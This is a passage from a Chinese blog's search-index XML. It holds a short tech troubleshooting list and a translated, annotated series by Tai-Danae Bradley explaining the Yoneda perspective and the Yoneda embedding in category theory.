            <tag> Compiler </tag>
            
            <tag> Computer Science </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>赛博疑难杂症药方</title>
      <link href="/2024/04/12/%E8%B5%9B%E5%8D%9A%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87%E8%8D%AF%E6%96%B9/"/>
      <url>/2024/04/12/%E8%B5%9B%E5%8D%9A%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87%E8%8D%AF%E6%96%B9/</url>
      
        <content type="html"><![CDATA[<ul><li><code>git add .</code> 仍有文件无法加入<ul><li>可能是submodule导致，即使删除子模块的<code>.git</code>文件夹也不足够，还需要<code>git rm --cached</code></li></ul></li><li>电脑怎样都没有声音，声卡等硬件均无问题，驱动没有更改过<ul><li>检查是否是Windows更新导致，可以回滚</li></ul></li><li>远程桌面出现奇奇怪怪的渲染问题<ul><li>可能是由于远程设备没有连接屏幕，需要保持屏幕开启；或者使用虚拟显示器（Virtual display）</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Miscellaneous </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Miscellaneous </tag>
            
            <tag> On Going </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>&lt;译&gt;Tai-Danae Bradley: 米田视角→米田嵌入→米田引理</title>
      <link href="//yoneda/"/>
      <url>//yoneda/</url>
      
        <content type="html"><![CDATA[<h1 id="米田视角-→-米田嵌入-→-米田引理"><a href="#米田视角-→-米田嵌入-→-米田引理" class="headerlink" title="米田视角 → 米田嵌入 → 米田引理"></a>米田视角 → 米田嵌入 → 米田引理</h1><p><em>注：本标题为译者添加。</em><br>原作者： <a href="https://www.math3ma.com/about">Tai-Danae Bradley</a><br>翻译： CubicY<br>部分图片与启发来源：<a href="https://bartoszmilewski.com/2015/09/01/the-yoneda-lemma/trackback/">Bartosz Milewski</a></p><h2 id="译者序"><a href="#译者序" class="headerlink" title="译者序"></a><a name="prelude"></a>译者序</h2><p>米田引理(Yoneda Lemma)往往是新手在学习范畴论时遇到的第一个大障碍，犹如五十音图之于日语初学者。然而就译者本人看来，其难度并非来自于思维上的复杂，而更多来自于符号滥用（让人不禁想问数学整个领域是不是都这样）。尽管一些概念嵌套层数过多对思考确实造成了阻碍，但是通过无歧义的符号与生动的图示可以大大降低心智负担。本系列作者在这两点上都做得十分出色，故产生了将其译为中文的想法。我会将一些个人的理解以“译者注”的形式放置在文章各处。尽管如此，我仍然强烈推荐读者阅读原文。</p><p>为了避免歧义，将本文使用的部分记号与约定列举在此：</p><ul><li>我们说“在X意义下等价”(up to X)有如下几种等价表述：<ul><li>对象间如果只相差一个X关系就可以转换为对方，那么我们认为他们是相同的</li><li>对象间最多相差一个X的关系</li><li>不考虑X带来的差异时相同</li><li>（如果X是一种等价关系）按照X关系划分不同等价类，如果对象在一个等价类里则视为相同<br>例如：“在同构意义下等价”指的是在这种视角下，如果两个不同的对象至多只是相差一个同构关系，那么我们认为他们就是一个对象；”up to permutations”可理解为“不考虑置换带来的差异时相同”；5, 8, 11在模3的意义下等价。</li></ul></li><li>$ \mathbf{Set}^{ \mathbf{C} } $ 表示一个函子范畴，其中的函子是 $ \mathbf{C} \rightarrow { \mathbf{Set} } $. 为了方便书写（$\mathbf{C}$ 所指代的范畴没有什么歧义时），本文有时会如此简写：<br>$$ \mathbf{Set} :&#x3D; \mathbf{Set}^{ \mathbf{C} }<br>$$ $$ \mathbf{Set}^{op} :&#x3D; \mathbf{Set}^{ \mathbf{C}^{op} } $$ 这一记号有时在其他文章中记作 $\mathbf{Funct}(\mathbf{C},\mathbf{Set})$</li><li>对于范畴C中的态射我们记作 $ \text{hom}_\mathbf{C}(X, Y) $，类似地，对 $\mathbf{C}$ 没有歧义时简写为$ \text{hom}(X, Y) $<ul><li>形如 $ \text{hom}(A, -): \mathbf{Set}^{ \mathbf{C} }$ 的记号代表一个函子，它将A发送到“所有从A出发的态射构成的集合”；这一记号有时在其他文章中记作 $h_A$</li><li>形如 $ \text{hom}(-, A): \mathbf{Set}^{ \mathbf{C}^{op} } $ 的记号代表一个函子，它将A发送到“所有以A为目标的态射构成的集合”，这一记号有时在其他文章中记作 $h^A$</li><li>形如 $ \text{hom}(-, -):  \mathbf{C} \rightarrow \mathbf{Set}^{ \mathbf{C}^{op} } 或 \mathbf{C}^{op} \rightarrow \mathbf{Set}^{ \mathbf{C} } $ 的记号将C对应到一个自然变换范畴，对于每个Y(或X)有$ h^Y(X)&#x3D;h_X(Y)&#x3D;\text{hom}(X, Y) $是新范畴中的对象，所有Y(或X)的取值对应的新对象构成新范畴的全部元素，这一记号有时在其他文章中记作 $h^{(-)}$ 或 $h$ 。根据本文对Yoneda嵌入的定义，本文中按 $ \mathbf{C} \rightarrow \mathbf{Set}^{ \mathbf{C}^{op} }$阐释。</li><li>$h^{(-)}(f)_X$ 意为对于C中的态射 $f: A \rightarrow A’$，$h^{(-)}(f)$ 是一个自然变换，当其限制在每个分量(component) $ X $ 上时有 $ \text{hom}(X, A) \rightarrow \text{hom}(X, A’)$</li></ul></li><li>许多文章会直接将 co-Yoneda引理 称作 Yoneda引理，co-Yoneda嵌入 称作 Yoneda嵌入 。为了避免歧义，本文规定如下（但本质上没有区别，不需要过于担心带来会混乱）：<ul><li>Yoneda嵌入： $\mathscr{Y}: \mathbf{C} \rightarrow \mathbf{Set}^{ \mathbf{C}^{op} }$</li><li>Yoneda引理： $\mathbf{Nat}(\text{hom}(−,X),F)\cong F(X).$</li><li>co-Yoneda嵌入： $\mathscr{co-Y}: \mathbf{C}^{op} \rightarrow \mathbf{Set}^{ \mathbf{C} }$</li><li>co-Yoneda引理： $\mathbf{Nat}(\text{hom}(X,-),F)\cong F(X).$<br>译者推荐尽量使用英文的术语（例如，使用”presheaf”而非“预层”这一称呼）以减少歧义。如果读者愿意，也可以使用平假名$よ$来命名Yoneda嵌入（可能比较有趣吧）。</li></ul></li></ul><p>这里有几条锦囊也许能帮你快速抓住核心，如有错漏欢迎斧正！如果在重新阅读时有晕头转向之感（尤其是第三部分），不妨试着阅读一番（<strong>如果是初次阅读不妨跳过，可以看完文章再回头看</strong>）：</p><ul><li><p><strong>笔者认为，对于Yoneda引理（更准确的说，是推论 1）最精炼的总结是：“人是一切社会关系的总和。”</strong></p></li><li><blockquote><p>你在一个粒子加速器工作。你想要理解某个粒子，你所能做的就是将其他粒子甩到它上面，看看会发生什么。如果你了解你的神秘粒子对所有可能的测试粒子种类以及所有可能的测试能量大小是如何做出响应的，那么你就已经知道关于你的神秘粒子的一切了。<br>You work at a particle accelerator. You want to understand some particle. All you can do is throw other particles at it and see what happens. If you understand how your mystery particle responds to all possible test particles at all possible test energies, then you know everything there is to know about your mystery particle.<br><em>Source: <a href="https://mathoverflow.net/a/3223">https://mathoverflow.net/a/3223</a></em></p></blockquote></li><li><p>熟悉群论的读者可能会想到凯莱定理(Cayley’s theorem)，也即所有群 G 同构于在 G 上的对称群(即 Sym(G))的子群。事实上，可以认为这个定理是米田引理的一个特例。文末会提到如何构造一个只有单个对象、态射对应群元素的范畴并在其上应用Yoneda引理以证明之。</p><ul><li>在群作用语言下的等效表述：如果群作用子 $\sigma_g: G\rightarrow \text{Aut}_{\text{set} }(S)$ (也就是每个元素对应到一个自同构上)是单射的（也就是单同态），群作用 $G\times S\rightarrow S$在某个集合 S（S 可以来自 G 本身）上是忠实的</li><li>为什么<strong>这样的</strong>群作用是忠实的(faithful)？只需要关注单位元在集合 S 中对应的元素 u：此时在不同的自同构下 u 一定被发送(send)到不同元素上。（参见<a href="https://www.youtube.com/watch?v=sNX3txN9zc4&">Chapter 7: Group actions, symmetric group and Cayley’s theorem | Essence of Group Theory</a>）</li><li>接下来你会看到米田引理证明过程中也是通过关注恒等映射这样的“单位元”被发送至何处（这单位元其实如同一个“凝结核”，确定了其被发送至何方后将引发连锁反应，使得所有其他对象的去向被一一确定，后文会详细阐述），从而得出米田嵌入的忠实性。这不是巧合。</li></ul></li><li><p>译者这里给出一个例子帮助读者梳理第一推论想表达的：假设现有Int(I), Double(D), Float(F)三种类型，这个定理告诉我们Float类型的意义就是如下几句陈述的总和：</p><ul><li>对于任何F-&gt;I的函数，我们可以：<ul><li>将f: F-&gt;I转化为f’: I-&gt;I</li><li>将f: F-&gt;D转化为f’: I-&gt;D</li><li>将f: F-&gt;F转化为f’: I-&gt;F<br>以及</li><li>将g: I-&gt;I转化为g’: F-&gt;I </li><li>将g: I-&gt;D转化为g’: F-&gt;D</li><li>将g: I-&gt;F转化为g’: F-&gt;F<br>六种转化的具体方式确定下来。</li></ul></li><li>对于任何F-&gt;D的函数，我们可以…</li><li>对于任何F-&gt;F的函数，我们可以…<br>（如果你觉得怪怪的，那也许是因为协变与逆变的小问题）<br>例如，对于函数downcast: Double-&gt;Float，我们能将取整函数floorF: Float-&gt;Int转为取整函数floorD: Double-&gt;Int.<br>所以对于如下两个代码片段，他们是等价的，可以互相转换：<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//A</span></span><br><span class="line">Double a</span><br><span class="line"><span class="type">Int</span> <span class="variable">c</span> <span class="operator">=</span> floorD(a)</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//B</span></span><br><span class="line">Double a</span><br><span class="line"><span class="type">Float</span> <span class="variable">b</span> <span class="operator">=</span> downcast(a)</span><br><span class="line"><span class="type">Int</span> <span class="variable">c</span> <span class="operator">=</span> floorF(b)</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//C</span></span><br><span class="line">Double a</span><br><span class="line"><span class="type">Int</span> <span class="variable">c</span> <span class="operator">=</span> floorF(downcast(a))</span><br></pre></td></tr></table></figure>B与C显然是等价的。<br>A转B是一种扩展，这种扩展的意义是：Float这种类型可以通过在Double和Int间定义这些函数的转换关系创造出来。<br>B转A是一种缩减，这种缩减的意义是：我们不需要Float类型的具体中间值，也能运算出结果！<br>所以Float这一类型，或者说任何特定类型的本质都是在定义“涉及该特定类型的转换关系”之间的一种特定变换关系（例如Float类型将指导如何复合floorF和downcast得到floorD）.<br>而这种“涉及该特定类型的转换关系”的特定变换关系，和“各种类型的转换关系”是同构的，而众所周知范畴论从不要求相等，只要求同构，<br><strong>所以一种类型即代表了一种对应该类型的特定变换关系，这种对应该类型的特定变换关系即定义了该类型。</strong></li></ul></li><li><p>（这里是基于co-Yoneda的叙述，但反正本质上没有区别）一种<a href="https://bartoszmilewski.com/2015/09/01/the-yoneda-lemma/trackback/">来自Bartosz Milewski的理解</a>：任何数据类型 T 都可以被一个函数 f 所取代。f 接受一个T的“处理器”handler（这个handler会把T转成目标类型） 并执行其余计算——即是续延（Continuation）。</p><ul><li>Haskell表述： <code>forall x . (t -&gt; x) -&gt; F x ≅ F t</code></li><li>我们可以把函子看成一种广义的容器（参见：<a href="https://bartoszmilewski.com/2014/01/14/functors-are-containers/trackback/">Functors are Containers</a>），所以左边就是把t转成x，然后变成F x这一步只是把x装起来变成可以装x类型的容器而已（我们并不关心这个F对x做了什么，我们关心的是“F对x的确做了些什么”这个事实本身——所以把F x当作一个容器好了，只需要把x放进去然后盖上盖子，不去理睬里面发生了什么）。假设容器一开始只能装x类型，但是如果对所有可能的类型x，“装入t类型为F t”这事都能通过handler: t-&gt;x转化为“装入x类型为F x”，那么这个容器事实上就是可以装t类型的。</li><li>译者的理解是，如果不把<code>F x</code>看作容器，而是看成类型构造器，那么可以这么解释：基于t构造新类型的实质，就是需要从每个t类型值构造新的F t类型值（所以在这种视角下，没有具体的转换细节，我们只知道有一个新类型F t带来新的关系，这些新的关系从旧关系导出）。对任意可能的类型x，每个t类型值都对应一种自己的<em>转换方式</em>，使得各个handler: t-&gt;x（某种意义上是关系）分别转化为一个值v，v的类型是基于x构造的新类型F x。 <strong>或者说，每个类型x都可以要求一个能把t值转化为x值的handler，而后用构造器F构造新类型时，就可以从handler这些旧有关系导出新类型F t与其他新类型F x之间的新关系；因为这些handler把类型t的运算细节“包办”了。</strong> 对于任意类型x，任意的handler都有这种<em>转换方式</em>（共同构成每个x的自然变换）。因此，应用类型构造器F时，类型t的每个值都会指导形如(t-&gt;…)的handler该如何转换为(F t-&gt;F…)，而这些自然变换构成了t类型存在的全部意义。所有和t有关的运算都可以视为一种类型构造，因此类型t的意义只有在运算中才会得到显现，一个不参与运算（不构造新类型）的类型没有任何存在价值，这符合直觉。</li></ul></li><li><p>分别取定F和A，会发现Yoneda引理这个同构关系对于F、t都是自然同构（参见<a href="https://www.bilibili.com/video/BV1AN4y1V7mH">【范畴论】第5讲，Yoneda引理</a>）</p></li></ul><p>每日更新！</p><h2 id="1-3：米田视角-The-Yoneda-Perspective"><a href="#1-3：米田视角-The-Yoneda-Perspective" class="headerlink" title="1&#x2F;3：米田视角(The Yoneda Perspective)"></a><a name="1"></a>1&#x2F;3：米田视角(The Yoneda Perspective)</h2><p><em>本部分翻译自 <a href="https://www.math3ma.com/blog/the-yoneda-perspective">https://www.math3ma.com/blog/the-yoneda-perspective</a></em></p><p><a href="http://blog.sigfpe.com/2006/11/yoneda-lemma.html?m=1">Dan Piponi</a> 说这是“数学中最难的 trivial 玩意”；<a href="https://ncatlab.org/nlab/show/Yoneda+lemma">nLab</a> 对它的看法是“初等的，深刻的，核心的”；而 <a href="http://www.math.jhu.edu/~eriehl/context.pdf">Emily Riehl</a> 则将其提名为“可以说是范畴论中最重要的结果”。然而，正如 <a href="http://www.maths.ed.ac.uk/~tl/categories/yoneda.ps">Tom Leinster</a> 所指出的，“许多人觉得它非常令人困惑。”<br>他们谈论的是什么？<br><strong>正是米田引理(Yoneda lemma)。</strong></p><p><img src="/yoneda/yoneda.jpg" loading="lazy"></p><p>“但……”你问道，“米田引理是啥？如果它还只是一个引理，那么……天哪……定理是什么？”</p><p>在回答问题之前，我想通过“悠闲地漫步”(leisurely stroll)于其中的两个推论来诱导出这个结果。实际上，话说在前头，我没有在范畴学领域的任何部分“漫步”的资质（译者注：作者的自谦）。的确，有资格为我们展示 Yoneda 引理（译者注：后文我们均如此称呼，因为更常用）这颗闪闪发光的精切钻石的，按理说是范畴学家们，而我不是范畴学家（译者注：依然是作者的自谦）。不过，我就是喜欢跟你讲述一些我所喜欢的事物，而Yoneda引理正是我喜欢的。因此，我们还是于此处相遇了！</p><p>现在我可以选择简单地告诉你推论在我眼里的样子，也可以选择简单地把引理甩给你。但正如 <a href="http://www.math.csi.cuny.edu/~maher/">Joseph Maher</a> 曾经说过的那样：</p><blockquote><p>数学是喜剧的反面，是反笑话(anti-joke)*。我们先告诉你笑点，然后费力地向你解释为什么这个笑点是对的。</p></blockquote><p>所以，首先我要告诉你们一个笑点——关于 Yoneda 引理两个推论的总结。<a href="http://www.math3ma.com/mathema/2016/10/6/the-sierpinski-space-and-its-special-property">我之前在这个博客上提到过它</a>，但我在这个系列中的目标是将它锚定在一个更正规严谨的数学基础上——也就是在费力地解释为什么它是正确的笑点。它是这样一个概念：</p><blockquote><p>数学对象完全由它们与其他对象的关系所决定。</p></blockquote><p>让我们称其为<em>Yoneda视角</em>。简而言之，它表明，如果你想理解对象（集合、群、拓扑空间等等），那么用<a href="http://www.math.harvard.edu/~mazur/preprints/when_is_one.pdf">Barry Mazur</a>的话来说，你会想要理解“它们与同类的、所有其他对象之间的关系网”。我们已经在几篇帖子中探讨了该理念——<a href="http://www.math3ma.com/mathema/2016/9/12/the-most-obvious-secret-in-mathematics">The Most Obvious Secret in Mathematics</a>和<a href="http://www.math3ma.com/mathema/2016/10/6/the-sierpinski-space-and-its-special-property">The Sierpinski Space and its Special Property</a>——所以我就不在这详细展开了。（如果你还没看过，请务必去看一看！你可以认为这些帖子是本文的前传。）但是我想提一嘴，Yoneda 视角启发了一种观点，一些数学家——还有这个博客**也越来越多地采纳了这种观点，也即</p><blockquote><p>数学对象的性质比它的定义更重要。</p></blockquote><p>为什么要采用这种观点？因为脱口而出背诵定义很容易：笛卡尔乘积是…，集合生成的自由群是…，商拓扑是…但定义并不总是能说明一切。积是天然带有<em>目标为它</em>或<em>从它出发</em>的映射的吗？如果一个自由群的生成集位于另一个群内，这两个群在某种程度上存在联系吗？商空间上的连续函数是什么样子的？这些问题都研究对象的属性——而正是属性定义了对象的特征。一旦我们拓宽视角，从对象所存在的范畴这一视角检视对象，答案就会水落石出。</p><p>我想表达的含义是什么呢？</p><p>假设你想探索对象 X 的性质。现在想象一下，把自己带入另一个对象 Y 的视角。然后问：“从 Y 的视点(vantage point)看起来，X 是什么样的？” 然后现在走到另一个对象 Z 旁，同样设身身处地问：“现在呢？从 Z 这里看，X 是什么样？”一直这么做下去，直到你站在范畴中每个对象的角度都剖析了 X 一遍。最后，你就会收集到大量关于 X 的信息。</p><p>就像<a href="https://www.youtube.com/watch?v=vwF7AHTQaoc">这个片段</a>。从一侧看，片段里的这座雕塑像一头大象；从另一个角度看，它又看起来像两只长颈鹿。但这两个角度都没有给出对雕塑完整的描述。为了真正理解这座雕塑，我们应该从所有可能的视点来观看它。范畴理论也有同样的观点：更多的视点提供了更多的信息。注意，划重点：Yoneda 引理说明</p><blockquote><p><strong>所有</strong>的视点会给出<strong>所有</strong>的信息。</p></blockquote><p>这就是上文所述 Yoneda视角 的本质，也是思维清晰的数学家如此重视态射、交换图、普遍性质等的原因之一（不知道你注意到了吗？）。这些都是关于关系的！当然，这只是一种直觉。实际数学形式是什么样的？那两个推论是什么？我所说的“…物体完全被…决定”究竟是什么意思？什么是“两个物体之间的关系”？我们如何看待“范畴中<em>所有对象的视点</em>”？Yoneda 引理<em>具体</em>是如何捕捉到这一点的？</p><p>这些是我们<a href="#2">下周</a>要回答的问题。<br>顺带一提，想复习一下范畴论吗？可以从这几个地方开始：<br><a href="http://www.math3ma.com/mathema/2017/1/17/what-is-category-theory-anyway">What is Category Theory, Anyway?</a><br><a href="http://www.math3ma.com/mathema/2017/1/23/what-is-a-category">What’s a Category?</a><br><a href="http://www.math3ma.com/mathema/2017/1/31/what-is-a-functor-part-1">What’s a Functor?</a><br><a href="http://www.math3ma.com/mathema/2017/2/6/what-is-a-natural-transformation">What’s a Natural Transformation?</a></p><hr><p>*: 所以数学家是 cocomedian? (那<a href="https://www.instagram.com/p/BLwhFLFgTbE/?taken-by=math3ma">comathematician</a>是什么?)（译者注：co-这一词根前缀在范畴论中被大量应用，用来表达“对偶的”“反方向的”等意味。哇，这岂不是可以说明 coconut 其实就是 nut？）<br>**: 参见 <a href="http://www.math3ma.com/mathema/2017/1/17/what-is-category-theory-anyway">Exhibit A</a> 和 <a href="http://www.math3ma.com/mathema/2016/9/12/the-most-obvious-secret-in-mathematics">Exhibit B</a> 和 <a href="http://www.math3ma.com/mathema/2016/10/6/the-sierpinski-space-and-its-special-property">Exhibit C</a> 和 <a href="https://twitter.com/math3ma/status/894700378792611840">Exhibit D</a> 和 <a href="http://www.math3ma.com/mathema/2017/2/22/crumbs">Exhibit E</a>, 作为例证</p><h2 id="2-3：米田嵌入-The-Yoneda-Embedding"><a href="#2-3：米田嵌入-The-Yoneda-Embedding" class="headerlink" title="2&#x2F;3：米田嵌入(The Yoneda Embedding)"></a>2&#x2F;3：<a name="2"></a>米田嵌入(The Yoneda Embedding)</h2><p><em>本部分翻译自 <a href="https://www.math3ma.com/blog/the-yoneda-embedding">https://www.math3ma.com/blog/the-yoneda-embedding</a></em></p><p><a href="#1">上周</a>我们开始探讨Yoneda引理。然而，我们并没有直接陈述Yoneda引理本身（因为缺乏动机），而是“悠闲地漫步”于其推论之一———Yoneda视角，也就是：</p><blockquote><p>一个对象完全由其与其他对象的“关系”确定，</p></blockquote><p>也就是：</p><blockquote><p>从范畴中的每个对象的视角看，对象是什么“样子”。</p></blockquote><p>但这让我们不禁想问，“实际数学形式是什么样的？那两个推论是什么推论？”在这篇文章中，我们会尽量找出答案。首先，让我们将这三个抽象叙述背后的具体数学概念具体化：</p><ul><li>“…两个对象之间的<em>关系</em>…”</li><li>“…范畴中<em>每个对象的视点</em>…”</li><li>“…一个对象<em>完全</em>由…<em>表征(characterized)</em>…”</li></ul><p>我们将逐一解密这些叙述方式。接下来，设 Set 表示集合范畴，C 为任意范畴。</p><hr><blockquote><p>“两个对象之间的关系”是指一个态射(morphism)。</p></blockquote><p>假如在 C 中，两个对象 X 和 Y 它们之间存在一个态射，那么我们就说他们“存在关系”。例如，如果X是一个具有<a href="http://www.math3ma.com/the-back-pocket/2016/8/26/comparing-topologies">离散拓扑</a>的拓扑空间，那么从 X 到 Y 就有很多关系——也就是有很多从 X 到 Y 的连续函数——对于任何空间Y。事实上，从一个离散空间出发的<em>所有</em>映射都是连续的。</p><p><img src="/yoneda/discrete.jpg" loading="lazy"></p><p>而反观域范畴，其中的对象之间的关系就非常少了——因为在具有不同特征(characteristics)的域之间不存在域同态！</p><hr><blockquote><p>“…范畴中<em>每个对象的视点</em>…” 编码在一个函子(functor)中</p></blockquote><p>要“从 C 中所有对象的视点”分析一个对象 X ，我们需要一种方法来跟踪 X 与 C 中所有对象的关系网。这个“关系网”指的就是所有<em>从Z到X</em>和<em>从X到Z</em>的态射集合，也就是这些集合：<br>$$\text{hom}(Z,X)\ 与\ \text{hom}(X,Z)\ \text{,对于范畴}\mathbf{C}\text{中的任意对象}Z\text{.}$$<br>注意到，我们希望C中的<em>每个</em>Z都对应一个不同的集合。一个可行的办法是通过<a href="https://www.math3ma.com/blog/what-is-a-functor-part-2">反变函子(contravariant functor)</a> $\text{hom}(-,X): \mathbf{C}^{op}\rightarrow \mathbf{Set}$，它将Z发送到集合$\text{hom}(Z,X)$，并将态射$f:Z\rightarrow W$发送到其<a href="https://www.math3ma.com/blog/the-sierpinski-space-and-its-special-property">拉回(pullback)</a> $f^*$，$f^*$则定义为“与f前复合(precomposing)”这一操作（译者注：前复合、后复合的解释参见<a href="https://math.stackexchange.com/questions/3889401/what-are-post-composition-and-pre-composition-in-category-theory">What are post-composition and pre-composition in category theory?</a>，同时请注意区分 $f^*$ 与 $f_*$ 这两个记号以免混淆前复合与后复合）。类似的，对于C中的所有Z，集合$\text{hom}(X,Z)$都在<a href="https://www.math3ma.com/blog/what-is-a-functor-part-1">协变函子(covariant functor)</a> $\text{hom}(X,-):\mathbf{C}\rightarrow\mathbf{Set}$的像(image)中。</p><p><img src="/yoneda/network.jpg" loading="lazy"></p><hr><blockquote><p>“一个对象‘完全由…确定’”意味着你知道它是在同构的意义下等价(up to isomorphism)的。</p></blockquote><p>说“一个对象X完全由…确定”意味着X作为由省略号处内容所表征的对象，其<a href="https://www.math3ma.com/blog/up-to-isomorphism">在同构的意义下</a>是唯一的。比如在本部分第一段中，省略号处对应的是“它们与其他对象的关系”。（尽管通常来说省略号处是一个<a href="https://jeremykun.com/2013/05/24/universal-properties/">普适性质</a>。这很正常。根据<a href="#1">Yoneda视角</a>，这两种填在省略号处的内容没啥区别！（译者注：确实不知道怎么翻译该句”the two addendums go hand in hand”，此处的两种addendums可能指的是追加在省略号处的可以是“对象带有的普适性质&#x2F;对象的定义蕴含的属性”，也可以是上文的“对象与其他对象的关系”，而这两种答案本质上是一样的））重点在于，如果Y与X以<em>相同</em>的方式与C中的<em>所有</em>其他对象联系——也就是说，如果从整个范畴的视点看，Y看起来就像X一样——那么X和Y一定是同构的。</p><p>例如，假设X和Y是拓扑空间，令$\cdot$表示单点空间，$I$和$S^1$表示单位区间和圆。那么我们有，</p><ul><li>X和Y具有相同的势(cardinality)当且仅当 $\text{hom}(\bullet,X) \cong \text{hom}(\bullet,Y)$</li><li>X和Y具有相同的路径空间(path space)当且仅当 $\text{hom}(I,X) \cong \text{hom}(I,Y)$</li><li>X和Y具有相同的（自由）<a href="https://en.wikipedia.org/wiki/Loop_space">环空间(loop space)</a>当且仅当 $\text{hom}(S^1,X) \cong \text{hom}(S^1,Y)$</li></ul><p><img src="/yoneda/probe.jpg" loading="lazy"></p><p>根据路径空间和环空间的定义，后两点成立。（它们分别是从$I$和$S^1$到$X$的所有连续函数的空间。）而至于第一点，只是因为一个形如$\bullet \to X$的映射其实就是在$X$中选择一个点。我们甚至可以说$\bullet \to X$是$X$的一个“$\bullet$塑造的元素”。类似地，一个路径$I \to X$可以被看作是$X$的一个“$I$塑造的元素”，而一个环$S^1 \to X$则是一个“$S^1$塑造的元素。” 本质上，我们使用$\bullet$、$I$和$S^1$来探测(probe)$X$和$Y$. 为了洞悉全貌，我们必须用<em>所有</em>空间探测它们——也即从<em>所有</em>空间的视点观察它们。</p><hr><p>在确立这些数学形式之后，“一个对象X完全由X与其他对象的关系所确定”这个说法现在可以明确为两个要点：</p><blockquote><p><strong>要点 #1.</strong> 关于X的一切我们需要知道的东西都被编码在$\text{hom}(-,X)$中。实际上，对象X<strong>表示</strong>了函子$\text{hom}(-,X)$. </p></blockquote><blockquote><p><strong>要点 #2.</strong> 当且仅当它们所表示的函子$\text{hom}(-,X)$和$\text{hom}(-,Y)$同构时，X和Y才是同构的。</p></blockquote><p>我们现在先考虑第一点，之后再重新审视第二点。所以我们真的能够像第一点说的那样用一个函子来确定一个对象吗？显然存在一个指派<br>$$X \mapsto \text{hom}(-, X)$$<br>这是因为范畴 $\mathbf{C}$ 中的任何对象 $X$ 都对应于一个函子 $\text{hom}(-,X)$，那么这个函子存在于… 呃… 在哪呢？$\text{hom}(-,X)$ 位于哪里？它也存在于一个范畴中！正如我们很久以前提到的，存在一个范畴 $\mathbf{Set}^{ \mathbf{C}^{op} }$ ，它的对象是从 $\mathbf{C}^{op}$ 到 $\mathbf{Set}$ 的函子，而其态射是自然变换。因此，存在一个函子 $\mathscr{Y}: \mathbf{C} \rightarrow \mathbf{Set}^{ \mathbf{C}^{op} }$，它将对象 $X$ 映射到 $\text{hom}(-, X)$，将一个态射 $f: X \rightarrow Y$ 映射到自然变换 $f_*: \text{hom}(-, X) \rightarrow \text{hom}(-, Y)$（你自己应该能验证）。这个自然变换的每个分量都是通过与 $f$ 后合成(postcomposing)得到的。在范畴 $\mathbf{Set}^{ \mathbf{C}^{op} }$ 中的函子被称为预层(presheaf)，我们感兴趣的预层，即形式为 $\text{hom}(-,X)$ 的预层，被称为<strong>可表示函子</strong>(representable functors)。但是我们需要证明这个命名是否合理： $X$ 真正地、忠实地且最大限度地<em>表示</em>函子 $\text{hom}(-, X)$ 吗？</p><p>答案是肯定的，但有一个条件：当 $\mathscr{Y}$ 将 $X$ 发送到预层范畴时，它必须<em>保留</em> $X$ 与 $\mathbf{C}$ 中对象之间的关系。换句话说，对于 $X$ 和 $Y$ 之间的每个关系，应恰好存在<em>一个</em>关系（自然变换）在$\text{hom}(-, X)$ 和 $\text{hom}(-, Y)$ 之间。更正式地说，对于 $\mathbf{C}$ 中的每对 $X$ 和 $Y$，由 $f \mapsto f_*$ 定义的函数<br>$$\text{hom}(X, Y) \rightarrow \mathbf{Nat}(\text{hom}(-, X), \text{hom}(-, Y))$$<br>应该是一个双射。（记号 $\mathbf{Nat}(-,-)$ 表示从 [留空] 到 [留空] 的自然变换集合（译者注：留空即为在该处使用 $-$ 处填入的对象填空）） 。如果 $\mathscr{Y}$ 满足这个条件，则称其为全忠实(fully faithful)*的并且称它将范畴 $\mathbf{C}$ <strong>嵌入</strong>到 $Set^{C^{op} }$ 中。</p><p><img src="/yoneda/embed.jpg" loading="lazy"></p><p>但问题来了：</p><p>这个把 $f$ 映射到 $f_*$ 的函数<br>$$\text{hom}(X, Y) \rightarrow \mathbf{Nat}(\text{hom}(-, X), \text{hom}(-, Y))$$<br>真的是一个双射吗？</p><p>单射性是显然的：如果 $f, g: X \rightarrow Y$ 是不同的态射，则它们的推出(pushforward) $f_*$ 和 $g_*$ 显然是不同的。但，满射性呢？给定任意的自然变换 $\eta: \text{hom}(-, X) \rightarrow \text{hom}(-, Y)$，是否真的存在一个态射 $f: X \rightarrow Y$ 使得 $\eta &#x3D; f_*$？也就是说，<br><strong><em>每个</em>可表示函子之间的自然变换，是否都来自于表示了它们的对象之间的态射？</strong></p><p>可能存在大量的自然变换 $\text{hom}(-, X)$ 和 $\text{hom}(-, Y)$！似乎不能指望其中的每个都来自于一个 $X \rightarrow Y$ 的态射。</p><p>然而，奇怪的是，真就是这样的！</p><blockquote><p>还真是！</p></blockquote><p>对于每个自然变换 $\eta: \text{hom}(-, X) \rightarrow \text{hom}(-, Y)$，存在唯一的态射 $f: X \rightarrow Y$，使得 $\eta &#x3D; f_*$. </p><p>而<strong>这</strong>正是Yoneda引理直接导出的。</p><p>结果是，$\mathscr{Y}$ 将 $\mathbf{C}$ 全忠实地嵌入到 $\mathbf{Set}^{ \mathbf{C}^{op} }$ 中。（这是上面提到的“要点 #1”的形式化表述。）因此，$\mathscr{Y}$ 被称为<strong>Yoneda嵌入</strong>。</p><p>但是，态射 $X \rightarrow Y$ 与自然变换 $\text{hom}(-, X) \rightarrow \text{hom}(-, Y)$ 之间是双射的这一事实仅仅是Yoneda引理导出的一个<em>结果</em>。正如我们<a href="#3">下周</a>将看到的，Yoneda引理其实是一个更强的结论！它是关于<strong>任意</strong>函子 $F: \mathbf{C}^{op} \rightarrow \mathbf{Set}$ 的自然变换 $\text{hom}(-, X) \rightarrow F$ 的结论。</p><hr><p>* 更一般地，对于任意函子 $F: \mathbf{C} \rightarrow \mathbf{D}$，存在一个函数 $\text{hom}_{\mathbf{C} }(X, Y) \rightarrow \text{hom}_{\mathbf{D} }(F(X), F(Y))$，由 $f 